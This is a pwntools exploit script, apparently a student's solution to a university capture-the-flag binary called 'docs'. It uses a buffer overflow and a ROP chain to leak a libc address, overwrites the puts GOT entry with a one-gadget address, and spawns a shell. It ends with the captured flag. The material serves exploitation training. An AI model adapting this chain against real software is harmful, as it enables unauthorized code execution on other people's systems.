from pwn import *

# context.log_level = 'debug'
# context.terminal = ['tmux', 'splitw', '-h', '-f']

CHALLENGE = "./docs"
URL = "offsec-chalbroker.osiris.cyber.nyu.edu"
PORT = 1204
NETID = b"xz4344"
LOCAL = False

if LOCAL:
    p = process(CHALLENGE)
else:
    p = remote(URL, PORT)
    p.recvuntil(b"NetID (something like abc123): ")
    p.sendline(NETID)

# p = gdb.debug(CHALLENGE, '''
#     b main
#     continue
# ''')

e = ELF(CHALLENGE)
r = ROP(CHALLENGE)
chain = [
    e.symbols.document,          # 1. Address of 'document' symbol - used as data reference
    r.rdi.address,               # 2. Address of "pop rdi; ret" gadget - for setting up first argument
    e.got.puts,                  # 3. Address of puts entry in GOT - will be leaked to get libc address
    e.plt.puts,                  # 4. Call puts to leak GOT entry
    r.rdi.address,               # 5. Address of "pop rdi; ret" gadget - setting up read's first argument 
    0x0,                         # 6. Value 0 will be popped into rdi (stdin file descriptor)
    r.rsi.address,               # 7. Address of "pop rsi; ret" gadget - for setting up second argument
    e.got.puts,                  # 8. Address of puts GOT entry - destination for read
    r.rdx.address,               # 9. Address of "pop rdx; ret" gadget - for setting up third argument
    0x8,                         # 10. Size to read (8 bytes) - will be popped into rdx
    e.plt.read,                  # 11. Call read to overwrite puts GOT entry with one gadget address
    r.rsi.address,               # 12. Address of "pop rsi; ret" gadget - setting up final puts call
    0x0,                         # 13. Value 0 will be popped into rsi
    r.rdx.address,               # 14. Address of "pop rdx; ret" gadget
    0x0,                         # 15. Value 0 will be popped into rdx
    e.plt.puts                   # 16. Final call to puts (now pointing to shell function)
]

print(p.recvuntil(b": ").decode())
msg_1 =b"D" * 0x88 + b"".join([p64(c) for c in chain])
p.sendline(msg_1)
log.info(f"Sending message in raw bytes: {msg_1}")

print(p.recvuntil(b": ").decode())
msg_2 = b"D" * 0x30 + p64(e.symbols.document + 0x88)
p.send(msg_2)
log.info(f"Sending message: {msg_2}")

glibc_puts_addr = u64(p.recv(6).ljust(8, b"\x00"))
log.info(f"Receiving leaked puts address: {hex(glibc_puts_addr)}")

glibc_e = ELF("libc.so.6")
glibc_base_addr = glibc_puts_addr - glibc_e.symbols.puts
glibc_one_gadget_addr = glibc_base_addr + 0xebc88

p.send(p64(glibc_one_gadget_addr))
log.info(f"Sending one gadget address: {hex(glibc_one_gadget_addr)}")

p.interactive()

# flag{rop!_bc952bc6091ed89c}
